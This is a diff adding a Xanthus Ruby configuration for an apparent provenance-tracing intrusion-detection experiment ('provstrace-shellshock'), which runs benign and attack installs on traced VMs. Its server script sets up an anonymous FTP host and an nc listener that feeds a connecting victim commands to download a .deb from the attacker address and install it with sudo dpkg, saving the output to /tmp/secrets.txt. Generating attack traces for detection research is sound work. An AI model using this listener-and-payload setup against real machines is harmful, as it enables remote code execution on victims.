@@ -1,0 +1,100 @@
+# -*- mode: ruby -*-
+# vi: set ft=ruby
+
+Xanthus.configure do |config|
+  config.name = 'provstrace-shellshock'
+  config.authors = 'Yilun Sun'
+  config.affiliation = 'TsingHua University'
+  config.email = 'yilunsun.se@gmail.com'
+  config.description = "Unicorn's SC-2 experiment."
+  config.seed = 43670961620410975231081934347800654831
+
+  config.script :pre do
+    %q{%{
+      sudo stap -e 'probe syscall.* {if(execname() == "bash") {printf("%d, %s %s %s[%s](%s)", gettimeofday_us(), fullpath_struct_path(task_cwd_path(task_current())), thread_indent(-1), name, probefunc(), argstr);}}probe syscall.*.return {if(execname() == "bash") {printf(" -> %s\\\\n", retstr);}}' -F -o /tmp/stap.log -v
+    }}
+  end
+
+  config.script :camflow_start do
+    Xanthus::CAMFLOW_START
+  end
+
+  config.script :normal do
+    %q{%{
+      sudo chmod 777 /vagrant/install.sh
+      bash /vagrant/install.sh
+    }}
+  end
+
+  config.script :attack do
+    %q{%{
+      sudo chmod 777 /vagrant/bad_install.sh
+      bash /vagrant/bad_install.sh
+    }}
+  end
+
+  config.script :camflow_stop do
+    Xanthus::CAMFLOW_STOP
+  end
+
+  config.script :server do
+    %q{%{
+      sudo tee /etc/apt/sources.list <<-'EOF'
+      deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse
+      deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse
+      deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse
+      deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse
+      deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse
+      deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse
+      deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse
+      deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse
+      deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse
+      deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse
+      EOF
+
+      sudo apt-get -y update
+      sudo apt-get -y install build-essential
+      sudo DEBIAN_FRONTEND=noninteractive apt-get -y install python-pip python-dev
+      sudo pip install pyftpdlib
+
+      mkdir /tmp/ftptest
+      cd /tmp/ftptest
+      cp /vagrant/ipscan_3.5.5_amd64.deb /tmp/ftptest
+      sudo python -m pyftpdlib -p21 -w &
+      sleep 5
+      echo "uname -r ; ls ; wget ftp://anonymous@192.168.33.3:21/ipscan_3.5.5_amd64.deb ; sudo dpkg -i ipscan_3.5.5_amd64.deb ; exit" | nc -l 8585 > /tmp/secrets.txt &
+      sleep 5
+    }}
+  end
+
+  config.vm :camflow do |vm|
+    vm.box = "YilunSun/provstap-w3c-headless"
+    vm.version = "0.0.4"
+    vm.ip = '192.168.33.8'
+  end
+
+  config.vm :server do |vm|
+    vm.box = 'bento/ubuntu-18.04'
+    vm.version = '201812.27.0'
+    vm.ip = '192.168.33.3'
+  end
+
+  config.job :normal_camflow do |job|
+    job.iterations = 125
+    job.tasks = { camflow: [:camflow_start, :normal, :camflow_stop] }
+    job.inputs = { camflow: ['install.sh'] }
+    job.outputs = {
+      camflow: { config: '/etc/camflow.ini', camflow: '/tmp/audit.log', stap: '/tmp/stap.log' }
+    }
+  end
+
+  config.job :attack_camflow do |job|
+    job.iterations = 25
+    job.tasks = { server: [:server], camflow: [:pre, :camflow_start, :attack, :camflow_stop] }
+    job.inputs = { server: ['ipscan_3.5.5_amd64.deb'], camflow: ['bad_install.sh'] }
+    job.outputs = {
+      server: { trace: '/tmp/secrets.txt' },
+      camflow: { config: '/etc/camflow.ini', camflow: '/tmp/audit.log', stap: '/tmp/stap.log' }
+    }
+  end
+end
